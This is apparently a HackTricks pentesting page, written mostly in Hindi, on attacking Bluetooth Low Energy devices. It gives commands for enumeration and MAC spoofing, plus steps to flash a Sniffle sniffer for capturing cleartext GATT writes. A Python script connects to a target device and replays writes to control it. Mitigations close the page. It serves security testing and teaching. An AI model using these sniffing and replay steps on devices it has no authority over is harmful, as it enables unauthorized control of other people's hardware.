# Pentesting BLE - Bluetooth Low Energy

{{#include ../../banners/hacktricks-training.md}}

## परिचय

Bluetooth 4.0 specification के बाद से उपलब्ध, BLE केवल 40 चैनल उपयोग करता है, जो 2400 से 2483.5 MHz की रेंज को कवर करते हैं। इसके विपरीत, पारंपरिक Bluetooth उसी रेंज में 79 चैनल उपयोग करता है।

BLE devices का संचार **advertising packets** (**beacons**) भेजकर होता है; ये packets BLE डिवाइस के मौजूद होने की सूचना पास के अन्य डिवाइसों को प्रसारित करते हैं। ये beacons कभी-कभी भी **send data** करते हैं।

सुनने वाला डिवाइस, जिसे central device भी कहा जाता है, किसी advertising packet का जवाब एक **SCAN request** भेजकर दे सकता है जो विशेष रूप से उस advertising device को भेजा गया होता है। उस स्कैन का **response** उसी संरचना का उपयोग करता है जो **advertising** packet में होती है, साथ ही अतिरिक्त जानकारी जो प्रारंभिक advertising request में समा नहीं पाई थी, जैसे कि पूरा device name।

![](<../../images/image (152).png>)

Preamble byte frequency को synchronize करता है, जबकि चार-बाइट का access address एक **connection identifier** होता है, जो उन परिदृश्यों में उपयोग होता है जहाँ एक ही चैनलों पर कई डिवाइस कनेक्शन स्थापित करने की कोशिश कर रहे होते हैं। आगे, Protocol Data Unit (**PDU**) में **advertising data** होता है। PDU के कई प्रकार होते हैं; सबसे सामान्यतः उपयोग किए जाने वाले ADV_NONCONN_IND और ADV_IND हैं। डिवाइस **ADV_NONCONN_IND** PDU प्रकार का उपयोग करते हैं यदि वे **don’t accept connections**, केवल advertising packet में डेटा भेजते हैं। डिवाइस **ADV_IND** का उपयोग करते हैं यदि वे **allow connections** और एक **connection** स्थापित हो जाने पर **stop sending advertising** packets कर देते हैं।

### GATT

The **Generic Attribute Profile** (GATT) परिभाषित करता है कि **device should format and transfer data** कैसे। जब आप किसी BLE device के attack surface का विश्लेषण कर रहे होते हैं, तो आप अक्सर GATT (या GATTs) पर ध्यान केंद्रित करेंगे, क्योंकि यही तरीका है जिससे **device functionality gets triggered** और डेटा कैसे store, grouped, और modified होता है। GATT किसी डिवाइस की characteristics, descriptors, और services को एक तालिका में 16- या 32-बिट मानों के रूप में सूचीबद्ध करता है। एक **characteristic** वह **data** मान है जो central device और peripheral के बीच **sent** होता है। इन characteristics में **descriptors** हो सकते हैं जो उनके बारे में **provide additional information about them**। यदि वे किसी विशेष क्रिया को करने से संबंधित हैं तो **Characteristics** अक्सर **grouped** में **services** के रूप में रखे जाते हैं।

## Enumeration
```bash
hciconfig #Check config, check if UP or DOWN
# If DOWN try:
sudo modprobe -c bluetooth
sudo hciconfig hci0 down && sudo hciconfig hci0 up

# Spoof MAC
spooftooph -i hci0 -a 11:22:33:44:55:66
```
### GATTool

**GATTool** किसी अन्य डिवाइस के साथ **कनेक्शन स्थापित** करने, उस डिवाइस की **विशेषताएँ** सूचीबद्ध करने, और उसके एट्रिब्यूट्स को पढ़ने और लिखने की अनुमति देता है.\
GATTTool `-I` विकल्प के साथ एक interactive shell लॉन्च कर सकता है:
```bash
gatttool -i hci0 -I
[ ][LE]> connect 24:62:AB:B1:A8:3E Attempting to connect to A4:CF:12:6C:B3:76 Connection successful
[A4:CF:12:6C:B3:76][LE]> characteristics
handle: 0x0002, char properties: 0x20, char value handle:
0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb
handle: 0x0015, char properties: 0x02, char value handle:
0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb
[...]

# Write data
gatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-write-req <characteristic handle> -n <value>
gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "04dc54d9053b4307680a"|xxd -ps)

# Read data
gatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-read -a 0x16

# Read connecting with an authenticated encrypted connection
gatttool --sec-level=high -b a4:cf:12:6c:b3:76 --char-read -a 0x002c
```
### Bettercap
```bash
# Start listening for beacons
sudo bettercap --eval "ble.recon on"
# Wait some time
>> ble.show # Show discovered devices
>> ble.enum <mac addr> # This will show the service, characteristics and properties supported

# Write data in a characteristic
>> ble.write <MAC ADDR> <UUID> <HEX DATA>
>> ble.write <mac address of device> ff06 68656c6c6f # Write "hello" in ff06
```
## Sniffing and actively controlling unpaired BLE devices

कई कम-लागत BLE peripherals pairing/bonding लागू नहीं करते। बिना bonding के, Link Layer encryption कभी सक्षम नहीं होती, इसलिए ATT/GATT ट्रैफ़िक cleartext में होता है। एक off-path sniffer connection को follow कर सकता है, GATT operations को decode कर characteristic handles और values सीख सकता है, और कोई भी nearby host फिर connect करके उन writes को replay कर device को control कर सकता है।

### Sniffing with Sniffle (CC26x2/CC1352)

हार्डवेयर: Sonoff Zigbee 3.0 USB Dongle Plus (CC26x2/CC1352) जिसे NCC Group’s Sniffle firmware से re-flashed किया गया है।

Linux पर Sniffle और इसके Wireshark extcap को इंस्टॉल करें:
```bash
if [ ! -d /opt/sniffle/Sniffle-1.10.0/python_cli ]; then
echo "[+] - Sniffle not installed! Installing at 1.10.0..."
sudo mkdir -p /opt/sniffle
sudo chown -R $USER:$USER /opt/sniffle
pushd /opt/sniffle
wget https://github.com/nccgroup/Sniffle/archive/refs/tags/v1.10.0.tar.gz
tar xvf v1.10.0.tar.gz
# Install Wireshark extcap for user and root only
mkdir -p $HOME/.local/lib/wireshark/extcap
ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py $HOME/.local/lib/wireshark/extcap
sudo mkdir -p /root/.local/lib/wireshark/extcap
sudo ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py /root/.local/lib/wireshark/extcap
popd
else
echo "[+] - Sniffle already installed at 1.10.0"
fi
```
Sonoff को Sniffle firmware से फ्लैश करें (सुनिश्चित करें कि आपका serial device मेल खाता है, e.g. /dev/ttyUSB0):
```bash
pushd /opt/sniffle/
wget https://github.com/nccgroup/Sniffle/releases/download/v1.10.0/sniffle_cc1352p1_cc2652p1_1M.hex
git clone https://github.com/sultanqasim/cc2538-bsl.git
cd cc2538-bsl
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install pyserial intelhex
python3 cc2538-bsl.py -p /dev/ttyUSB0 --bootloader-sonoff-usb -ewv ../sniffle_cc1352p1_cc2652p1_1M.hex
deactivate
popd
```
Wireshark में Sniffle extcap के माध्यम से कैप्चर करें और filtering करके state-changing writes पर जल्दी से pivot करें:
```text
_ws.col.info contains "Sent Write Command"
```
यह क्लाइंट की ओर से ATT Write Commands को हाइलाइट करता है; handle और value अक्सर सीधे डिवाइस क्रियाओं से मैप होते हैं (उदाहरण: buzzer/alert characteristic में 0x01 लिखना, बंद करने के लिए 0x00)।

Sniffle CLI के त्वरित उदाहरण:
```bash
python3 scanner.py --output scan.pcap
# Only devices with very strong signal
python3 scanner.py --rssi -40
# Filter advertisements containing a string
python3 sniffer.py --string "banana" --output sniff.pcap
```
वैकल्पिक sniffer: Nordic’s nRF Sniffer for BLE + Wireshark plugin भी काम करता है। छोटे/सस्ते Nordic dongles पर आप आमतौर पर USB bootloader को overwrite करते हैं ताकि sniffer firmware लोड की जा सके, इसलिए या तो आप एक समर्पित sniffer dongle रखते हैं या बाद में bootloader को restore करने के लिए J-Link/JTAG की आवश्यकता होती है।

### GATT के माध्यम से सक्रिय नियंत्रण

एक बार जब आप sniffed traffic से एक writable characteristic handle और value पहचान लेते हैं, तो किसी भी central के रूप में connect करें और वही write करें:

- Nordic nRF Connect for Desktop (BLE app) के साथ:
- nRF52/nRF52840 dongle चुनें, scan करें और target से connect करें।
- GATT database ब्राउज़ करें, target characteristic ढूंढें (अक्सर इसका एक friendly name होता है, उदाहरण के लिए Alert Level)।
- sniffed bytes के साथ Write करें (उदा., trigger करने के लिए 01, रोकने के लिए 00)।

- Windows पर Nordic dongle का उपयोग करके Python + blatann से ऑटोमेट करें:
```python
import time
import blatann

# CONFIG
COM_PORT = "COM29"  # Replace with your COM port
TARGET_MAC = "5B:B1:7F:47:A7:00"  # Replace with your target MAC

target_address = blatann.peer.PeerAddress.from_string(TARGET_MAC + ",p")

# CONNECT
ble_device = blatann.BleDevice(COM_PORT)
ble_device.configure()
ble_device.open()
print(f"[-] Connecting to {TARGET_MAC}...")
peer = ble_device.connect(target_address).wait()
if not peer:
print("[!] Connection failed.")
ble_device.close()
raise SystemExit(1)

print("Connected. Discovering services...")
peer.discover_services().wait(5, exception_on_timeout=False)

# Example: write 0x01/0x00 to a known handle
for service in peer.database.services:
for ch in service.characteristics:
if ch.handle == 0x000b:  # Replace with your handle
print("[!] Beeping.")
ch.write(b"\x01")
time.sleep(2)
print("[+] And relax.")
ch.write(b"\x00")

print("[-] Disconnecting...")
peer.disconnect()
peer.wait_for_disconnect()
ble_device.close()
```
### ऑपरेशनल नोट्स और निवारक उपाय

- Linux पर मजबूत channel hopping और connection following के लिए Sonoff+Sniffle को प्राथमिकता दें। बैकअप के लिए एक अतिरिक्त Nordic sniffer रखें।
- pairing/bonding के बिना, कोई भी नज़दीकी attacker लिखने वाली गतिविधियों (writes) को देख सकता है और unauthenticated writable characteristics पर अपने खुद के replay/craft किए गए writes भेज सकता है।
- निवारक उपाय: pairing/bonding को आवश्यक बनाएं और encryption लागू करें; characteristic permissions को सेट करें ताकि authenticated writes आवश्यक हों; unauthenticated writable characteristics को न्यूनतम रखें; Sniffle/nRF Connect के साथ GATT ACLs को validate करें।

## संदर्भ

- [Start hacking Bluetooth Low Energy today! (part 2) – Pentest Partners](https://www.pentestpartners.com/security-blog/start-hacking-bluetooth-low-energy-today-part-2/)
- [Sniffle – A sniffer for Bluetooth 5 and 4.x LE](https://github.com/nccgroup/Sniffle)
- [Firmware installation for Sonoff USB Dongle (Sniffle README)](https://github.com/nccgroup/Sniffle?tab=readme-ov-file#firmware-installation-sonoff-usb-dongle)
- [Sonoff Zigbee 3.0 USB Dongle Plus (ZBDongle-P)](https://sonoff.tech/en-uk/products/sonoff-zigbee-3-0-usb-dongle-plus-zbdongle-p)
- [Nordic nRF Sniffer for Bluetooth LE](https://www.nordicsemi.com/Products/Development-tools/nRF-Sniffer-for-Bluetooth-LE)
- [nRF Connect for Desktop](https://www.nordicsemi.com/Products/Development-tools/nRF-Connect-for-desktop)
- [blatann – Python BLE library for Nordic devices](https://blatann.readthedocs.io/en/latest/)

{{#include ../../banners/hacktricks-training.md}}
